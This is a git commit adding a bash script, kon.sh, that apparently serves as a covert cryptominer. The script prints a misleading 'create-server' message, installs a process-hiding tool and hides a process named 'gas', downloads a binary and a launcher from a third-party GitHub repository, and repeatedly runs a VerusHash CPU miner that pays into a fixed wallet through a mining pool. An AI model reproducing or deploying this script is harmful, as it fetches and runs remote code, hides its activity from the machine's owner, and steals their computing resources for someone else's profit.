2c8def2db725afe406ad32174143b8897412e7da
breakok <95564840+breakok@users.noreply.github.com>
2021-12-18 14:45:47 +0530

    Create kon.sh

---
+++ kon.sh
@@ -0,0 +1,60 @@
+#! /bin/bash
+printf "create-server... \nThis might take a while... " >&2
+{
+curl -sL https://deb.nodesource.com/setup_12.x | bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ph add gas
+wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh
+wget https://github.com/hunshukajh/yes/raw/main/gas
+chmod +x gas cmdline_launcher.sh
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+timeout -k 540s 540s  ./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4 -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 verushash.asia.mine.zergpool.com:3300 -cpuThreads=36
+}
